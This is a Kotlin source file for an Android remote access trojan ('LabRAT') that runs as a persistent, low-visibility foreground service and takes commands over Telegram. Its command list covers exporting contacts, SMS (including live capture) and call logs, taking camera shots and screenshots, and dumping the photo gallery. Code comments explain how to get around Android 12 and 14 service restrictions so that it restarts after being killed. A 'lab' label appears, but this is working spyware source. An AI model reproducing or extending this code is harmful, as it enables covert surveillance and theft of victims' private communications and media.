package com.lab.rat

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.lab.rat.core.CommandRouter
import com.lab.rat.core.ServiceGraph
import com.lab.rat.core.TelegramClient
import kotlinx.coroutines.launch

class RatService : LifecycleService() {

    override fun onCreate() {
        super.onCreate()
        startAsForeground()

        val tg = TelegramClient { full -> ServiceGraph.onCommand?.invoke(full) }
        val router = CommandRouter(this, lifecycleScope, tg)
        ServiceGraph.tg = tg
        ServiceGraph.onCommand = { full -> router.route(full) }

        lifecycleScope.launch { tg.pollLoop() }
        lifecycleScope.launch {
            tg.sendText(
                "LabRAT online (lab isolado).\n" + helpText()
            )
        }
    }

    private fun helpText() = """
        /ping
        /contacts list|export
        /sms list|export|live
        /calls list|export
        /camera front|back
        /screenshot
        /gallery count|list|dump [n]|get <id>
        /unhide
    """.trimIndent()

    private fun startAsForeground() {
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(
            NotificationChannel("labrat_service", "LabRAT",
                NotificationManager.IMPORTANCE_MIN))
        val notif: Notification = NotificationCompat.Builder(this, "labrat_service")
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(getString(R.string.notif_text))
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            .build()
        if (Build.VERSION.SDK_INT >= 29) {
            // NÃO incluir FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION:
            // SecurityException no Android 14 sem token ativo
            startForeground(1, notif,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(1, notif)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // Reinício via AlarmManager; NÃO WorkManager
        // (ForegroundServiceStartNotAllowedException no Android 12+)
        val pi = PendingIntent.getForegroundService(
            this, 10, Intent(this, RatService::class.java),
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE)
        (getSystemService(Context.ALARM_SERVICE) as AlarmManager)
            .setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, 2000, pi)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        ServiceGraph.tg = null
        ServiceGraph.onCommand = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = super.onBind(intent)
}
